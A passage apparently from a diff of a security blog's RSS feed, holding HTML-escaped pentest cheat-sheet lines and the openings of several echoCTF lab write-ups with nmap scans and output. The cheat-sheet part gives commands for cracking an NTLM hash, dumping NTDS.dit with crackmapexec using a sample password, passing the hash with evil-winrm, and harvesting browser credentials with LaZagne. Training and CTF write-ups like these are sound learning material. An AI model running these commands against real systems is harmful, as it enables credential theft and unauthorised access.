+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">## Hashcat to crack the captured hashes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo hashcat -m &lt;span class="m">1000&lt;/span> 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="capturing-ntdsdit-with-crackmapexec">Capturing NTDS.dit with Crackmapexec&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo crackmapexec smb 10.129.201.57 -u bwilliamson -p &lt;span class="s1">&amp;#39;P@55w0rd!&amp;#39;&lt;/span> --ntds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="pass-the-hash-with-evil-winrm-example">Pass-the-Hash with Evil-WinRM Example&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo evil-winrm -i 10.129.201.57 -u Administrator -H &lt;span class="s2">&amp;#34;64f12cddaa88057e06a81b54e73b949b&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;hr>
+&lt;h1 id="credential-hunting">Credential Hunting&lt;/h1>
+&lt;h2 id="key-terms-to-search">Key-Terms-to-Search&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">## Using `Lazagne.exe` to discover credentials from web-browsers
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">start&lt;/span> lazagne.exe all
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Resource: &lt;a href="https://github.com/AlessandroZ/LaZagne/releases/">Binary&lt;/a>&lt;/p></description></item><item><title>echoCTF Dolph Writeup: Nginx to Root via LD_PRELOAD</title><link>https://hack.com.cy/writeups/echoctf/dolph/dolph/</link><pubDate>Wed, 23 Jul 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/dolph/dolph/</guid><description>&lt;h2 id="video-walkthrough">Video Walkthrough&lt;/h2>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/k2FNSCH3DDg?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video">&lt;/iframe>
+ &lt;/div>
+
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=k2FNSCH3DDg">&lt;img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube">&lt;/a>&lt;/p>
+&lt;h1 id="dolph">Dolph&lt;/h1>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;p>Start by port scanning the target machine.&lt;/p>
+&lt;h2 id="nmap">NMAP&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -nvv -p- -sC -sV -T4 10.0.50.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="output">Output&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http syn-ack ttl &lt;span class="m">63&lt;/span> nginx 1.10.3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-methods: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Supported Methods: GET HEAD
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Tmp uploader
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It seems that there is an nginx 1.10.3 running on port 80&lt;/p></description></item><item><title>echoCTF Cupidme Writeup: File Upload to Root via SMTP</title><link>https://hack.com.cy/writeups/echoctf/cupidme/cupidme/</link><pubDate>Mon, 14 Jul 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/cupidme/cupidme/</guid><description>&lt;h2 id="video-walkthrough">Video Walkthrough&lt;/h2>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/WN2w8sJOLlI?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video">&lt;/iframe>
+ &lt;/div>
+
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=WN2w8sJOLlI">&lt;img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube">&lt;/a>&lt;/p>
+&lt;h1 id="cupidme">Cupidme&lt;/h1>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;p>Start by port scanning the target machine&lt;/p>
+&lt;h2 id="nmap">NMAP&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -nvv -p- 10.0.50.1 -T4 -sC -sV
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="output">Output&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http syn-ack ttl &lt;span class="m">63&lt;/span> nginx 1.14.2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Welcome to Cupid&lt;span class="err">&amp;#39;&lt;/span>s homepage
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-methods: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Supported Methods: GET HEAD POST
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Found an nginx webserver version 1.14.2 running on port 80.&lt;/p></description></item><item><title>echoCTF Smithers Writeup: Vulenrable Memcached version to root via Command Injection</title><link>https://hack.com.cy/writeups/echoctf/smithers/smithers/</link><pubDate>Sat, 28 Jun 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/smithers/smithers/</guid><description>&lt;h2 id="video-walkthrough">Video Walkthrough&lt;/h2>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/8ZxR4WGVqEQ?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video">&lt;/iframe>
+ &lt;/div>
+
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=8ZxR4WGVqEQ">&lt;img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube">&lt;/a>&lt;/p>
+&lt;h1 id="smithers">Smithers&lt;/h1>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="nmap-port-scan">NMAP Port Scan&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -vv -p- 10.0.50.0 -T4 -sC -sV -oA nmap/allports
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="output">Output&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">10888/tcp open http syn-ack ttl &lt;span class="m">63&lt;/span> nginx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Network Tools
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">11211/tcp open memcached syn-ack ttl &lt;span class="m">63&lt;/span> Memcached 1.5.12 &lt;span class="o">(&lt;/span>uptime &lt;span class="m">625&lt;/span> seconds&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Analyzing the NMAP output we can see that we found ports 10888 and 11211 open.
+Port 10888 seems that runs an &lt;code>NGINX&lt;/code> web server.
+Port 11211 its more interesting as the NMAP scan identifies that there is service running called &lt;code>Memcached&lt;/code> and we can see the version of it as well &lt;code>1.5.12&lt;/code>&lt;/p></description></item><item><title>echoCTF Alister Writeup: File Upload to Root via Exposed Credentials</title><link>https://hack.com.cy/writeups/echoctf/alister/alister/</link><pubDate>Wed, 25 Jun 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/alister/alister/</guid><description>&lt;h2 id="video-walkthrough">Video Walkthrough&lt;/h2>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/1vaSEr6mfFA?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video">&lt;/iframe>
+ &lt;/div>
+
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=1vaSEr6mfFA&amp;amp;t=1s">&lt;img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube">&lt;/a>&lt;/p>
+&lt;h1 id="alister">Alister&lt;/h1>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="nmap-port-scan">NMAP Port Scan&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="output">Output&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">PORT&lt;/span> &lt;span class="n">STATE&lt;/span> &lt;span class="n">SERVICE&lt;/span> &lt;span class="n">REASON&lt;/span> &lt;span class="n">VERSION&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">1337&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">tcp&lt;/span> &lt;span class="n">open&lt;/span> &lt;span class="n">http&lt;/span> &lt;span class="n">syn&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">ack&lt;/span> &lt;span class="n">ttl&lt;/span> &lt;span class="mi">63&lt;/span> &lt;span class="n">nginx&lt;/span> &lt;span class="mf">1.18.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">methods&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span>&lt;span class="n">_&lt;/span> &lt;span class="n">Supported&lt;/span> &lt;span class="nl">Methods&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">GET&lt;/span> &lt;span class="n">HEAD&lt;/span> &lt;span class="n">POST&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span>&lt;span class="n">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">title&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Site&lt;/span> &lt;span class="n">doesnt&lt;/span> &lt;span class="n">have&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="nf">title&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">UTF&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">).&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span>&lt;span class="n">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">header&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">nginx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.18.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">5244&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">tcp&lt;/span> &lt;span class="n">open&lt;/span> &lt;span class="n">unknown&lt;/span> &lt;span class="n">syn&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">ack&lt;/span> &lt;span class="n">ttl&lt;/span> &lt;span class="mi">63&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">fingerprint&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">strings&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">GenericLines&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.1&lt;/span> &lt;span class="mi">400&lt;/span> &lt;span class="n">Bad&lt;/span> &lt;span class="n">Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">plain&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">utf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">Connection&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">close&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">GetRequest&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.0&lt;/span> &lt;span class="mi">200&lt;/span> &lt;span class="n">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">Date&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Mon&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">23&lt;/span> &lt;span class="n">Jun&lt;/span> &lt;span class="mi">2025&lt;/span> &lt;span class="mi">19&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">26&lt;/span> &lt;span class="n">GMT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;!&lt;/span>&lt;span class="n">DOCTYPE&lt;/span> &lt;span class="n">html&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">html&lt;/span> &lt;span class="n">lang&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;en&amp;#34;&lt;/span> &lt;span class="n">translate&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;no&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">head&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;utf-8&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;viewport&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;width=device-width, initial-scale=1&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;referrer&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;same-origin&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;generator&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;AList V3&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;theme-color&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;#000000&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;google&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;notranslate&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">async&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">link&lt;/span> &lt;span class="n">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;shortcut icon&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;image/ico&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="n">AList&lt;/span>&lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ALIST&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">cdn&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">monaco_cdn&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">undefin&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">HTTPOptions&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.0&lt;/span> &lt;span class="mi">200&lt;/span> &lt;span class="n">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">Date&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Mon&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">23&lt;/span> &lt;span class="n">Jun&lt;/span> &lt;span class="mi">2025&lt;/span> &lt;span class="mi">19&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">27&lt;/span> &lt;span class="n">GMT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;!&lt;/span>&lt;span class="n">DOCTYPE&lt;/span> &lt;span class="n">html&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">html&lt;/span> &lt;span class="n">lang&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;en&amp;#34;&lt;/span> &lt;span class="n">translate&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;no&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">head&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;utf-8&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;viewport&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;width=device-width, initial-scale=1&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;referrer&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;same-origin&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
